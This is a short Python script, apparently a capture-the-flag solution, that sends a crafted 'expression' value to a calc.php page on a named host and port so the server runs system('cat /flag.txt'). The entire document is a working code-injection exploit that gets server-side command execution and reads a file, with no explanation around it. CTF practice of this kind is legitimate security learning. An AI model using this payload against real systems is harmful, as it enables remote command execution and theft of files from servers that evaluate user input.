import requests

TARGET_URL = 'http://gc1.eng.run:30824'

def eval(cmd):
    data={
        "expression":cmd
    }

    res = requests.post(f"{TARGET_URL}/calc.php",data=data)
    print(res.text)

eval('system("cat /flag.txt")')